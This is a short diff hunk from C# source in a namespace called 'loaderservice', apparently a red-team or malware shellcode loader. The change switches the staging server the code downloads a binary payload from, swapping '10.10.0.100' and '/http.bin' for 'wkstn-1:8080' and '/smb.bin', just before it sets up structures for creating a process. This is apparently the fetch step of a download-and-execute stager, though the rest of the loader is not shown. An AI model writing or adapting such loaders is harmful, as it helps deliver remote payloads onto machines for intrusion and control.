@@ -25,8 +25,8 @@ namespace loaderservice
             byte[] buf;
             using (var client = new HttpClient())
             {
-                client.BaseAddress = new Uri("http://10.10.0.100");
-                buf = await client.GetByteArrayAsync("/http.bin");
+                client.BaseAddress = new Uri("http://wkstn-1:8080");
+                buf = await client.GetByteArrayAsync("/smb.bin");
             }
             STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
